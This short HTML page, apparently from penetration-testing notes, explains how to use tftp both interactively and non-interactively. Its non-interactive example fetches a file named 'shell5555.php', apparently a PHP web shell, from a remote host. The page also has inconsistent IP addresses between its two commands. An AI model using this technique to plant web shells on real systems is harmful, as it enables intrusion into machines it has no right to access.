<title>Tftp</title>
</head><body>Some versions of tftp are run interactively, like this:<br/>
$ tftp 192.168.0.101<br/>
tftp&gt; get myfile.txt<br/>
<br/>
If we can't run it interactively, for whatever reason, we can do this trick<br/>
tftp 191.168.0.101 &lt;&lt;&lt; &quot;get shell5555.php shell5555.php&quot;<br/>
<br/>
<br/>
</body></html>
